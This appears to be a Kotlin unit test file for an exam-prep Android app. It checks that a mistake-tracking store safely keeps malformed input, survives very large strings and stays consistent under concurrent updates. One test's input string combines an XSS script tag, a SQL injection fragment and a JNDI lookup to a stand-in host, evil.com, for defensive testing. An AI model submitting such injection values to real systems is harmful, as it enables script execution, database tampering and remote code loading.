package com.examprep.android.feature.security

import com.examprep.android.feature.flashcards.FlashcardStore
import com.examprep.android.feature.leaderboard.LeaderboardStore
import com.examprep.android.feature.mistakes.MistakeVaultStore
import com.examprep.android.feature.roadmap.StudyPlannerStore
import com.examprep.domain.model.MistakeReason
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test

class AppSecurityAndConcurrencyTest {

    @Test
    fun testPromptInjectionAndMalformedStringsInMistakeVault() {
        val store = MistakeVaultStore()
        val dangerousInput = "<script>alert('xss')</script> OR '1'='1' -- \${jndi:ldap://evil.com/a} \u0000 \u202Ereversed\u202C"

        store.recordMistake(
            questionId = "q_sec_injection_01",
            questionText = dangerousInput,
            options = listOf(dangerousInput, "Option B", "Option C", dangerousInput),
            correctAnswer = dangerousInput,
            studentAnswer = dangerousInput,
            explanation = dangerousInput,
            subject = "Physics",
            chapter = "Security Mechanics",
            reason = MistakeReason.MISREAD_QUESTION
        )

        val item = store.mistakes.value.first { it.questionId == "q_sec_injection_01" }
        assertNotNull(item)
        assertEquals(dangerousInput, item.questionText)
        assertEquals(dangerousInput, item.correctAnswer)
    }

    @Test
    fun testExtremelyLargeInputPayloadsDoNotCrashStore() {
        val store = MistakeVaultStore()
        val megaString = "A".repeat(100_000)

        store.recordMistake(
            questionId = "q_huge_string",
            questionText = megaString,
            options = listOf(megaString),
            correctAnswer = megaString,
            studentAnswer = megaString,
            explanation = megaString,
            subject = "Chemistry"
        )

        val retrieved = store.mistakes.value.first { it.questionId == "q_huge_string" }
        assertEquals(100_000, retrieved.questionText.length)
    }

    @Test
    fun testConcurrentMistakeVaultUpdatesThreadSafety() = runBlocking {
        val store = MistakeVaultStore()
        val jobCount = 50

        val deferreds = (1..jobCount).map { i ->
            async(Dispatchers.Default) {
                store.recordMistake(
                    questionId = "concurrent_q_$i",
                    questionText = "Concurrent Question $i",
                    options = listOf("1", "2", "3", "4"),
                    correctAnswer = "1",
                    studentAnswer = "2",
                    explanation = "Explanation $i",
                    subject = if (i % 2 == 0) "Physics" else "Mathematics"
                )
            }
        }

        deferreds.awaitAll()

        val mistakes = store.mistakes.value
        assertTrue("Store must contain at least jobCount items", mistakes.size >= jobCount)
    }

    @Test
    fun testConcurrentFlashcardMasteryToggling() = runBlocking {
        val store = FlashcardStore()
        val targetCard = "fc_phy_1"
        val initialReviews = store.flashcards.value.first { it.id == targetCard }.reviewCount

        val deferreds = (1..20).map {
            async(Dispatchers.Default) {
                store.toggleMastered(targetCard)
            }
        }

        deferreds.awaitAll()

        val updatedCard = store.flashcards.value.first { it.id == targetCard }
        assertEquals(initialReviews + 20, updatedCard.reviewCount)
    }

    @Test
    fun testPeerBenchmarkScoreBoundaries() {
        val report = LeaderboardStore.get().report.value
        
        // Mathematical bounds
        assertTrue("Topper score must be between 0 and 300 for JEE", report.topperScore in 0..300)
        assertTrue("Average score must be less than or equal to topper", report.averageScore <= report.topperScore)
        assertTrue("User score must be valid", report.userScore in -75..300)
        assertTrue("Total participants must be positive", report.totalParticipants > 0)
        assertTrue("Rank must be >= 1", report.userRank >= 1)
        assertTrue("Percentile must be in 0..100", report.userPercentile in 0f..100f)
    }
}
